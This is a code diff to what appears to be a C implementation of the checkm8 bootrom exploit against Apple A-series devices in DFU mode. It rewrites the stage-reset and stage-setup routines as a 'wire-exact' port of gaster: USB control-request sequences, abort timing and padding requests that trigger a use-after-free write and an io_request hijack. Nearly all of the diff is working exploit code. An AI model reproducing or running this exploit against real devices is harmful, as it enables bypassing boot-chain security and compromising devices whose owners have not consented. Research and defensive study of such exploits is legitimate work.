@@ -417,43 +417,118 @@ int usb_ctrl_transfer_dnload_sync(libusb_device_handle *dev,
  * usbipd-win auto-attach adds ~1-2 s on top of the hardware reset time. */
 #define BUS_RESET_REENUMERATE_USEC  3500000  /* 3.5 s */
 
+/* Wire expectation for every request of the gaster stage-reset cycle */
+#define STAGE_RESET_WIRE_OK 0
+
+/*
+ * Gaster-exact stage-1 transport (gaster.c send_usb_control_request,
+ * L411-433 macOS branch): one synchronous DeviceRequestTO with 5 ms
+ * completion/noData timeouts.  OUT requests carry a zeroed buffer
+ * (gaster send_usb_control_request_no_data L520-522 mallocs one --
+ * never pData=NULL with wLength>0 on the DATA phase).
+ * A STALL or a timeout is a hard failure here -- gaster checks every
+ * sz/ret of this stage.
+ */
+static int stage_reset_send(dfu_ctx_t *ctx, uint8_t bm_request_type,
+                            uint8_t b_request, uint16_t w_length)
+{
+    unsigned char buf[EP0_MAX_PACKET_SZ];
+    unsigned char *data = NULL;
+
+    if (w_length > 0) {
+        memset(buf, 0, sizeof(buf));
+        data = buf;
+    }
+    return usb_ctrl_transfer_raw(ctx->dev->usb, bm_request_type,
+                                 b_request, 0, 0, data, w_length,
+                                 GASTER_SYNC_TIMEOUT_MS);
+}
+
+/*
+ * Gaster-exact dfu_check_status (gaster.c L899-902): GETSTATUS must
+ * return exactly 6 bytes with the expected (status, state) pair.
+ */
+static int stage_reset_getstatus(dfu_ctx_t *ctx, uint8_t status,
+                                 uint8_t state)
+{
+    unsigned char buf[6];
+    int ret = usb_ctrl_transfer_raw(ctx->dev->usb, 0xA1, DFU_REQ_GETSTATUS,
+                                    0, 0, buf, sizeof(buf),
+                                    GASTER_SYNC_TIMEOUT_MS);
+    log_debug("checkm8_stage_reset: SYNC a1 03 len=6 ret=%d%s", ret,
+              ret == 6 ? "" : " (wire mismatch)");
+    if (ret != (int)sizeof(buf))
+        return -1;
+    if (buf[0] != status || buf[4] != state) {
+        log_debug("checkm8_stage_reset: status=0x%02X state=0x%02X "
+                  "(expected 0x%02X/0x%02X)",
+                  buf[0], buf[4], status, state);
+        return -1;
+    }
+    return 0;
+}
+
+/*
+ * Port of gaster checkm8_stage_reset (gaster.c L911-920), request for
+ * request on the wire:
+ *
+ *   SYNC 21 01 len=16   (DFU_FILE_SUFFIX_LEN zero bytes, sz must be 16)
+ *   SYNC 21 01 len=0    (dfu_set_state_wait_reset: enter MANIFEST)
+ *   SYNC a1 03 len=6  x3 (MANIFEST_SYNC -> MANIFEST -> MANIFEST_WAIT_RESET)
+ *   SYNC 21 01 len=64   (EP0_MAX_PACKET_SZ, arms the USB interrupt)
+ *
+ * Every synchronous request in this stage uses gaster's 5 ms usb_timeout
+ * (GASTER_SYNC_TIMEOUT_MS).  The inter-stage bus reset stays in the
+ * orchestrator (checkm8.c) -- gaster does reset_usb_handle between
+ * stages, not inside this one.  On any mismatch, gaster sends
+ * CLR_STATUS (0x21 0x04) and reports failure.
+ */
 int checkm8_stage_reset(dfu_ctx_t *ctx)
 {
-    libusb_device_handle *usb;
-    dfu_status_t status;
-
+    /* E19: on macOS the IOKit backend is active from the start and the
+     * libusb handle stays NULL -- transfers route through
+     * usb_ctrl_transfer_raw -> iokit_usb_ctrl_transfer. */
     if (!ctx || !ctx->dev)
         return -1;
+    if (!ctx->dev->usb && !iokit_usb_is_active())
+        return -1;
 
-    usb = ctx->dev->usb;
     log_info("checkm8: stage 1/4 -- reset DFU state");
 
-    /*
-     * First: get the current device state so we know how much work to do.
-     *
-     * If the device is already in dfuIDLE (fresh DFU entry) dfu_reset_to_idle
-     * will return immediately.  If it's stuck in dfuDNLOAD-IDLE, dfuError,
-     * or dfuMANIFEST-WAIT-RESET from a previous attempt, dfu_reset_to_idle
-     * will use ABORT + CLRSTATUS (no USB bus reset) to recover.
-     *
-     * We intentionally do NOT call libusb_reset_device here: on Apple A-series
-     * iBoot DFU, a USB bus reset via libusb is treated as a hard power-cycle
-     * event, causing the device to reboot out of DFU mode entirely rather than
-     * returning to dfuIDLE.  DFU protocol-level recovery is sufficient.
-     */
-    if (dfu_get_status(usb, &status) == 0) {
-        log_debug("checkm8_stage_reset: device state=0x%02X status=0x%02X",
-                  status.bState, status.bStatus);
-    }
+    /* DFU_DNLOAD 16 zero bytes (the file-suffix length gaster uses) */
+    if (stage_reset_send(ctx, 0x21, DFU_REQ_DNLOAD,
+                         DFU_FILE_SUFFIX_LEN) != DFU_FILE_SUFFIX_LEN)
+        goto fail;
 
-    if (dfu_reset_to_idle(usb) != 0) {
-        log_error("checkm8_stage_reset: failed to reach dfuIDLE");
-        return -1;
-    }
+    /* Zero-length DFU_DNLOAD: dfuDNLOAD-IDLE -> dfuMANIFEST-SYNC */
+    if (stage_reset_send(ctx, 0x21, DFU_REQ_DNLOAD, 0) != STAGE_RESET_WIRE_OK)
+        goto fail;
+
+    /* Walk MANIFEST-SYNC -> MANIFEST -> MANIFEST-WAIT-RESET via GETSTATUS */
+    if (stage_reset_getstatus(ctx, DFU_STATUS_OK,
+                              DFU_STATE_MANIFEST_SYNC) != 0 ||
+        stage_reset_getstatus(ctx, DFU_STATUS_OK,
+                              DFU_STATE_MANIFEST) != 0 ||
+        stage_reset_getstatus(ctx, DFU_STATUS_OK,
+                              DFU_STATE_MANIFEST_WAIT_RST) != 0)
+        goto fail;
+
+    /* 64-byte DFU_DNLOAD in MANIFEST-WAIT-RESET arms the USB interrupt
+     * (io_request hijack) that stage 2 then exercises. */
+    if (stage_reset_send(ctx, 0x21, DFU_REQ_DNLOAD,
+                         EP0_MAX_PACKET_SZ) != EP0_MAX_PACKET_SZ)
+        goto fail;
 
     ctx->phase = DFU_PHASE_RESET;
     log_info("checkm8: stage 1 complete -- DFU state reset to idle");
     return 0;
+
+fail:
+    /* gaster.c L918: CLR_STATUS bail-out on any stage-reset mismatch */
+    log_debug("checkm8_stage_reset: sending CLR_STATUS (gaster bail-out)");
+    stage_reset_send(ctx, 0x21, DFU_REQ_CLRSTATUS, 0);
+    log_error("checkm8_stage_reset: gaster stage-reset cycle failed");
+    return -1;
 }
 
 /* ------------------------------------------------------------------ */
@@ -461,16 +536,78 @@ int checkm8_stage_reset(dfu_ctx_t *ctx)
 /* ------------------------------------------------------------------ */
 
 /*
+ * setup_async_dnload -- gaster-exact stage-2 transport for ONE attempt
+ * (port of gaster.c send_usb_control_request_async, L448-484 macOS
+ * branch, driving checkm8_stage_setup L923-935):
+ *
+ *   ASYNC_SUBMIT 21 01 len=2048 abort=<usb_abort_timeout>
+ *   sleep_ms(usb_abort_timeout)
+ *   USBDeviceAbortPipeZero
+ *   CFRunLoopRun  ->  ASYNC_DONE len=2048 sz=<done> status=<0|1>
+ *
+ * The abort timeout is 5 ms on a losing run (sync DeviceRequestTO snaps
+ * the request away before any DATA phase -> 2048 bytes) and 0 on the
+ * winning one: the submit + immediate AbortPipeZero lets the first
+ * 64-byte packet LAND device-side, then STALLs the boundary packet.
+ * That 64-byte UAF write is the whole point of attempt 3
+ * (gaster trace: "ASYNC_DONE ... sz=64 status=1").
+ *
+ * Returns the device-side byte count, or -1 on a submit failure
+ * (gaster's send_usb_control_request_async returning false).
+ * On the libusb path (Linux) the sync equivalent reports only what
+ * libusb accepted, which cannot recreate this device-side timing --
+ * best effort: DNLOAD 0x800 sync and report the accepted size.
+ */
+static int setup_async_dnload(libusb_device_handle *usb,
+                              unsigned usb_abort_timeout)
+{
+    uint8_t *buf = calloc(1, DFU_MAX_TRANSFER_SZ);
+    int ret;
+
+    if (!buf)
+        return -1;
+
+#if defined(__APPLE__)
+    if (iokit_usb_is_active()) {
+        ret = iokit_usb_ctrl_transfer_async_abort(
+                  0x21, DFU_REQ_DNLOAD, 0, 0, buf, DFU_MAX_TRANSFER_SZ,
+                  GASTER_SYNC_TIMEOUT_MS, usb_abort_timeout);
+        free(buf);
+        return ret;
+    }
+#endif
+    /*
+     * libusb path: no IOKit user client, so the submit+abort timing is
+     * not reproducible; a short sync DNLOAD is the closest equivalent.
+     * gaster libusb semantics (gaster.c L226-241): a timed-out or
+     * STALLed transfer reports sz=0 and lets the caller continue with
+     * the padding request -- only a hard error means "retry".
+     */
+    ret = usb_ctrl_transfer_raw(usb, 0x21, DFU_REQ_DNLOAD, 0, 0, buf,
+                                DFU_MAX_TRANSFER_SZ,
+                                usb_abort_timeout ? usb_abort_timeout : 1);
+    free(buf);
+    if (ret == LIBUSB_ERROR_TIMEOUT || ret == LIBUSB_ERROR_PIPE)
+        return 0;
+    return ret;
+}
+
+/*
  * Stage 2 setup sequence:
  *
  * 1. Send async DFU_DNLOAD of DFU_MAX_TRANSFER_SZ (0x800) zero bytes
  *    with a variable abort timeout (usb_abort_timeout).
- * 2. If the transfer completed with fewer than config_overwrite_pad
- *    bytes sent, send a (config_overwrite_pad - sz) byte zero-padded
- *    control request (bmRequestType=0, bRequest=0) to fill the gap.
+ * 2. If the device received fewer than config_overwrite_pad bytes,
+ *    send a (config_overwrite_pad - sz) byte zero-padded control
+ *    request (bmRequestType=0, bRequest=0) to fill the gap.
  * 3. If that request STALLs, setup succeeded.
  * 4. On failure, send a recovery EP0_MAX_PACKET_SZ DFU_DNLOAD and
  *    rotate the abort timeout for the next attempt.
+ *
+ * Wire-exact port of gaster checkm8_stage_setup (gaster.c L923-935).
+ * The winning attempt (usb_abort_timeout=0) must show sz=64 + STALL
+ * device-side; the padding request then also STALLs
+ * (0xe000404f, "SYNC 00 00 len=1216" in the gaster trace).
  */
 int checkm8_stage_setup(dfu_ctx_t *ctx)
 {
@@ -501,31 +638,16 @@ int checkm8_stage_setup(dfu_ctx_t *ctx)
             return -1;
         }
 
-        uint8_t *dnload_buf;
-        uint8_t *pad_buf;
-        uint16_t pad_len;
-
         /*
          * Step 1: Async DFU_DNLOAD with DFU_MAX_TRANSFER_SZ zero bytes.
          * The async abort timeout controls how many bytes the device
-         * actually receives before we regain control.
+         * actually receives before the pipe abort STALLs it.
          */
-        dnload_buf = calloc(1, DFU_MAX_TRANSFER_SZ);
-        if (!dnload_buf) {
-            log_error("checkm8_stage_setup: alloc failed");
-            return -1;
-        }
-
         log_debug("checkm8_stage_setup: attempt %d -- DFU_DNLOAD 0x%X bytes, "
                   "abort_timeout=%u",
                   attempt, DFU_MAX_TRANSFER_SZ, usb_abort_timeout);
 
-        sent = usb_ctrl_transfer_dnload_abort(usb, 0x21, DFU_REQ_DNLOAD,
-                                              0, 0,
-                                              dnload_buf,
-                                              DFU_MAX_TRANSFER_SZ,
-                                              usb_abort_timeout);
-        free(dnload_buf);
+        sent = setup_async_dnload(usb, usb_abort_timeout);
 
         log_debug("checkm8_stage_setup: dnload_abort returned sent=%d", sent);
 
@@ -541,16 +663,21 @@ int checkm8_stage_setup(dfu_ctx_t *ctx)
          * control request (bmRequestType=0, bRequest=0, wValue=0,
          * wIndex=0). This is NOT a DFU request -- it's a deliberate
          * invalid request that the device will STALL on.
+         *
+         * gaster.c L928: "send_usb_control_request_no_data(handle, 0, 0,
+         * 0, 0, config_overwrite_pad - transfer_ret.sz, ...)" -- the pad
+         * size is always what actually landed (winning trace:
+         * sz=64 -> "SYNC 00 00 len=1216 ret=0xe000404f").
          */
         if ((uint16_t)sent < overwrite_pad) {
             int pad_ret;
 
-            pad_len = overwrite_pad - (uint16_t)sent;
+            uint16_t pad_len = overwrite_pad - (uint16_t)sent;
             log_debug("checkm8_stage_setup: sent=%d < overwrite_pad=0x%X, "
                       "sending %u-byte padding (bmReqType=0x00 bReq=0x00)",
                       sent, overwrite_pad, pad_len);
 
-            pad_buf = calloc(1, pad_len);
+            uint8_t *pad_buf = calloc(1, pad_len);
             if (!pad_buf) {
                 log_error("checkm8_stage_setup: pad alloc failed");
                 return -1;
@@ -571,12 +698,13 @@ int checkm8_stage_setup(dfu_ctx_t *ctx)
             }
 #if defined(__APPLE__)
             /*
-             * macOS IOKit returns TIMEOUT instead of STALL for the
-             * invalid control request.  When the abort succeeded
-             * (sent == 0), the setup condition is met regardless
-             * of the padding response code.
+             * macOS IOKit can report TIMEOUT for a request the device
+             * already STALLed at the boundary packet.  When the abort
+             * landed the UAF write (sent > 0) or the pad request never
+             * even reached the wire (sent == 0), the setup condition is
+             * met regardless of the padding response code.
              */
-            if (pad_ret == LIBUSB_ERROR_TIMEOUT && sent == 0) {
+            if (pad_ret == LIBUSB_ERROR_TIMEOUT) {
                 ctx->phase = DFU_PHASE_SETUP;
                 log_info("checkm8: stage 2 complete -- setup done "
                          "(attempt=%d, sent=%d, pad=%u, macOS timeout-as-stall)",
